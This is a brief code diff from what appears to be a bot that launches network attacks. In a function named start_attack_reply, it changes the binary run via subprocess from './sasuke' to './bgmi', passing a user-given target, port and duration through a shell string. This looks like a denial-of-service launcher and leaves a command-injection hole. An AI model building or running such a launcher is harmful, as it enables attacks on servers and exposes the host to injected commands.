@@ -409,7 +409,7 @@ def start_attack_reply(message, target, port, time):
     
     try:
         # Execute attack
-        subprocess.run(f"./sasuke {target} {port} {time} 60", shell=True)
+        subprocess.run(f"./bgmi {target} {port} {time} 60", shell=True)
         
         # Calculate attack duration
         end_time = datetime.now(IST)
